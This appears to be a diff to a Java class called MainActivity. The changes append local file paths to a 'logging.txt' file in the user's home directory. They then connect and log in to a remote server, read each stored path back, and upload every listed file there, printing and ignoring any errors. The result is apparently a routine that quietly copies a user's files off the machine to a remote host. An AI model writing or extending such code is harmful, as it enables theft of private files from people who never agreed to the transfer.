@@ -27,11 +27,10 @@ class MainActivity{
         for(String s : files){
 
           try{
-          	 BufferedWriter bw4 = new BufferedWriter(new FileWriter(f1));
-           	 if(!f1.isDirectory()){
-            		bw4.write(s + "\n");
+          	 BufferedWriter bw4 = new BufferedWriter(new FileWriter(new File(string_home + "/logging.txt"), true));
+           		bw4.write(s + "\n");
             		bw4.close();
-            	}
+            	
         }
         catch(Exception e)
 	{
@@ -47,7 +46,7 @@ class MainActivity{
             System.out.println("e"  + e.toString()); 
         } 
     }
-	private String server;
+	private String server, line2;
 	private String string_home = System.getProperty("user.home");
 	String string_files;
 	private File f = new File(string_home + "log.txt");
@@ -93,15 +92,17 @@ class MainActivity{
 
 				client.connect(server);
 				client.login(name,pass);
-				 Scanner sends_dir = new Scanner(System.in);
-				 String scand_dir = sends_dir.next();
-				 client.changeDirectory(scand_dir);
                 		try{
-                			BufferedReader br7 = new BufferedReader(new FileReader(new File(string_home + "/log.txt")));
-                			String line2;
-                			while((line2 = br7.readLine()) == null){
+                			BufferedReader br7 = new BufferedReader(new FileReader(new File(string_home + "/logging.txt")));
+                			while((line2 = br7.readLine()) != null){
                 			    System.out.println("line2 : " + line2);
-                    
+                    				try{
+                    					client.upload(new File(line2));
+                    				}
+                    				catch(Exception error){
+                    					System.out.println("e : " + error.toString());
+                    					}
+                    					
                 			}
                 		}catch(Exception e){
                 				System.out.println("e : "  + e.toString());
